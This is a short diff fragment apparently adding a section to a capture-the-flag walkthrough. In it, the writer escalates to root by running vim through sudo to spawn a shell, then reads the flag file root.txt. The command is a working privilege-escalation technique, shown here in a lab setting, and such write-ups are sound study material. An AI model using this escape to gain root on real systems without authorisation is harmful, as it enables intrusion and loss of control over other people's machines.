@@ -268,3 +268,19 @@ $
 
 ```
 
+Using privilege escalation, check sudo -l for possible 
+
+```
+
+$ sudo vim -c ':!/bin/sh'
+
+# whoami 
+root
+# cd root
+# ls
+root.txt
+# cat root.txt  
+W3ll d0n3. You made it!
+# 
+
+```
